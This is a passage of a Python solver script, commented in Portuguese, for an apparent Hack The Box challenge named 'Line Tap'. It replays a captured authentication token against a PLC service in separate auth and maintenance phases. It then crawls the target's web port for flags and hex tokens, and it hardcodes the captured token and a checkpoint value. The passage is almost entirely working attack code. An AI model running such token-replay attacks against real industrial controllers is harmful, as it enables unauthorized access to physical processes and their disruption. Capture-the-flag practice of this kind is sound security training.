    seen: set[str] = set()
    found: list[bytes] = []
    likely = ["api/status", "api/checkpoint", "checkpoint", "latest", "status", "flag"]
    queue.extend(urllib.parse.urljoin(base, p) for p in likely)

    print(f"\n[*] Consultando serviço web em {base}")
    while queue and len(seen) < 20:
        url = queue.pop(0)
        if url in seen:
            continue
        seen.add(url)
        try:
            status, body, ctype = http_get(url, timeout)
        except urllib.error.HTTPError as e:
            body = e.read(200_000)
            status, ctype = e.code, e.headers.get("Content-Type", "")
        except (urllib.error.URLError, TimeoutError, OSError) as e:
            print(f"[-] HTTP {url}: {e}")
            continue

        text_preview = body.decode("utf-8", "replace").replace("\n", " ")[:240]
        print(f"[HTTP {status}] {url} ({ctype}) {text_preview}")

        for m in FLAG_RE.finditer(body):
            flag = m.group(0)
            if flag not in found:
                found.append(flag)
                print("\n" + "=" * 72)
                print("[FLAG WEB]", flag.decode("ascii", "replace"))
                print("=" * 72)

        # Só destaca tokens diferentes do token antigo capturado.
        for m in HEX_TOKEN_RE.finditer(body):
            token = m.group(0)
            if token.lower() != CAPTURED_TOKEN.hex().encode() and token not in found:
                found.append(token)
                print("[TOKEN WEB]", token.decode("ascii", "replace"))

        if "html" in ctype.lower() or b"<html" in body.lower() or b"<script" in body.lower():
            decoded = html.unescape(body.decode("utf-8", "replace"))
            patterns = [
                r'''(?:href|src)\s*=\s*["']([^"'#]+)["']''',
                r'''fetch\s*\(\s*["']([^"']+)["']''',
                r'''axios\.(?:get|post)\s*\(\s*["']([^"']+)["']''',
            ]
            for pat in patterns:
                for rel in re.findall(pat, decoded, flags=re.I):
                    nxt = urllib.parse.urljoin(url, rel)
                    parsed = urllib.parse.urlparse(nxt)
                    if parsed.hostname == host and parsed.port == port and nxt not in seen:
                        queue.append(nxt)
    return found


def main() -> int:
    p = argparse.ArgumentParser(description="Solver corrigido do HTB Line Tap")
    p.add_argument("host")
    p.add_argument("plc_port", type=int)
    p.add_argument("--web-port", type=int, default=None)
    p.add_argument("--timeout", type=float, default=1.5)
    p.add_argument("--wait", type=float, default=4.0)
    p.add_argument("--token", default=CAPTURED_TOKEN.hex(), help="token hexadecimal do PCAP")
    p.add_argument("--old-clock", action="store_true", help="reproduz o horário antigo do PCAP")
    args = p.parse_args()

    try:
        token = bytes.fromhex(args.token)
    except ValueError:
        print("[-] --token precisa ser hexadecimal", file=sys.stderr)
        return 2
    if len(token) != 8:
        print("[-] O token esperado tem 8 bytes / 16 caracteres hexadecimais", file=sys.stderr)
        return 2

    try:
        auth_phase(args.host, args.plc_port, args.timeout, token)
        # Sem pausa: o PCAP abre a segunda conexão logo após fechar a primeira.
        client, accepted = maintenance_phase(
            args.host, args.plc_port, args.timeout, args.wait, args.old_clock
        )
        plc_flags = list(client.flags)
        client.close()

        web_found: list[bytes] = []
        if args.web_port is not None:
            web_found = crawl_http(args.host, args.web_port, max(2.0, args.timeout))

        if plc_flags or any(x.startswith(b"HTB{") for x in web_found):
            return 0
        if accepted:
            print("\n[+] Replay aceito. Se a página web tiver um campo de checkpoint, use:")
            print("    bb322456bda87cee")
            print("[*] Também atualize/recarregue a interface web após o replay.")
            return 0
        print("\n[-] Replay ainda rejeitado. Rode novamente imediatamente após reiniciar a instância.")
        return 1
    except ConnectionRefusedError:
        print(f"[-] Conexão recusada em {args.host}:{args.plc_port}", file=sys.stderr)
        return 3
    except (socket.timeout, TimeoutError) as e:
        print(f"[-] Timeout: {e}", file=sys.stderr)
        return 4
    except OSError as e:
        print(f"[-] Erro de rede: {e}", file=sys.stderr)
        return 5


if __name__ == "__main__":
    raise SystemExit(main())
```

                                               
